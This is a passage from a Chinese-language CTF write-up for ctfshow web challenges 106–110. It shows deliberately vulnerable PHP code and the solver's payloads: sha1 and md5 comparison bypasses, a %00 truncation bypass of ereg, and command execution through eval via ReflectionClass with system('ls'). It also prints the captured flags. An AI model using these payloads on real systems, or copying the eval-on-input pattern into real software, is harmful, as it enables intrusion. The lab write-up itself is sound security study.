<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">)==</span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">!=</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>没什么好说的，一样的题。payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">get:v2=aaroZmOk</span></span>
<span class="line"><span style="color:#d4d4d4">post:v1=aaK1STfY</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{adfb1a68-</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">de8-</span><span style="color:#b5cea8">471</span><span style="color:#d4d4d4">f-ad67-bcadef44d2a2}</span></span></code></pre></div></div></figure><h3 id="web107parse_str理解md5绕过"><a class="markdownIt-Anchor" href="#web107parse_str理解md5绕过"></a> web107	(parse_str 理解 + md5 绕过)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">       </span><span style="color:#dcdcaa">parse_str</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">       </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'flag'</span><span style="color:#d4d4d4">]==</span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">       }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153300.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221116201512628"></p><p>所以这里只要构造 post 的 v1=flag=0 和？v3=QNKCDZO（md5 后为 0 的科学计数法）</p><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{d346c3f3-</span><span style="color:#b5cea8">8919</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">412</span><span style="color:#d4d4d4">e-b1ed-</span><span style="color:#b5cea8">81</span><span style="color:#d4d4d4">b20453b934}</span></span></code></pre></div></div></figure><h3 id="web108ereg绕过-00截断"><a class="markdownIt-Anchor" href="#web108ereg绕过-00截断"></a> web108	(ereg 绕过 %00 截断)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">ereg</span><span style="color:#d4d4d4"> (</span><span style="color:#ce9178">"^[a-zA-Z]+$"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'c'</span><span style="color:#d4d4d4">])===</span><span style="color:#569cd6">FALSE</span><span style="color:#d4d4d4">)  {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'error'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#6a9955">//只有36d的人才能看到flag</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">strrev</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'c'</span><span style="color:#d4d4d4">]))==</span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">error</span></span></code></pre></div></div></figure><p>ereg () 函数是一个老版本的用来进行正则匹配的函数，具体可以看这篇文章：</p><p><a target="_blank" rel="noopener" href="https://vimsky.com/examples/usage/php-ereg-function.html">PHP ereg () 用法及代码示例</a></p><p>strrev () 函数反转字符串。</p><p>这里 ereg 匹配是要成立的，也就是说我们只能输入字母，不能有数字或别的字符，且我们传入的参数经过逆转要等于 0x36d，这就太难构造了，所以想办法突破 ereg 匹配：</p><blockquote><p>ereg () 函数存在 NULL 截断漏洞，当传入的字符串包含 %00 时，只有 %00 前的字符串会传入函数并执行，而后半部分不会传入函数判断。 因此可以使用 **%00 截断，连接非法字符串，从而绕过函数 **</p></blockquote><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?c=a%</span><span style="color:#b5cea8">00778</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">ac1cb29-e52b-</span><span style="color:#b5cea8">41</span><span style="color:#d4d4d4">b0-a0df-</span><span style="color:#b5cea8">6725435</span><span style="color:#d4d4d4">f9477}</span></span></code></pre></div></div></figure><h3 id="web109原生类利用rce"><a class="markdownIt-Anchor" href="#web109原生类利用rce"></a> web109	(原生类利用 rce)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/[a-zA-Z]</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/[a-zA-Z]</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"echo new </span><span style="color:#9cdcfe">$v1</span><span style="color:#ce9178">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">());"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里主要是这一句：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"echo new </span><span style="color:#9cdcfe">$v1</span><span style="color:#ce9178">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">());"</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>这里 v1 只能用 php 原生类，因为 new 在前，代码中没有别的自定义类可用。</p><p>$v2 可以让我们 new 一个方法，并在方法参数中写入非法语句，只需要把后面的多余括号和别的字符补上、注释即可。理论来讲，任何原生类都是可行的。比如之前用到的反射类 Reflectionclass</p><p>payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">?v1=Reflectionclass</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v2=</span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'ls'</span><span style="color:#d4d4d4">));</span><span style="color:#6a9955">//</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153015.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221117194613990"></p><p>cat 这个 fl36d.txt 就行。</p><h3 id="web110原生类利用真无参数rce"><a class="markdownIt-Anchor" href="#web110原生类利用真无参数rce"></a> web110	(原生类利用 + 真无参数 rce)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: h1xa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\~</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\(</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\)</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\:</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\,</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">|[0-9]/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error v1"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d7ba7d">\~</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\`</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\!</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\@</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\#</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\*</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\(</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\)</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\=</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\[</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\:</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\'</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\,</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\?</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\/</span><span style="color:#d16969">|[0-9]/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"error v2"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"echo new </span><span style="color:#9cdcfe">$v1</span><span style="color:#ce9178">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">());"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>这里重要的还是最后一个语句</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"echo new </span><span style="color:#9cdcfe">$v1</span><span style="color:#ce9178">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#ce9178">());"</span><span style="color:#d4d4d4">);</span></span></code></pre></div></div></figure><p>但是由于过滤掉这么多，只允许我们输入纯字母，那么这里就是真无参数 rce</p><p>首先想，这是否可以进行一个扫目录，用 scandir 这种？结果查了下文档，发现并不是类，是个方法，用不了了。</p><p>但是思路应该是没错的，因为直接读文件是不太现实的。也就是说我们现在需要找到一个类，tostring 能打印输出，而且方法中也能遍历目录。</p><p>首先找到一个是 FilesystemIterator，其中有 DirectoryIterator::__toString</p><blockquote><p><strong>FilesystemIterator</strong> extends DirectoryIterator implements</p></blockquote><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153039.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221117211728122"></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222153204.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221117211757452"></p><p><strong>Example #1 A *<em>DirectoryIterator::__toString()*</em> example</strong></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span 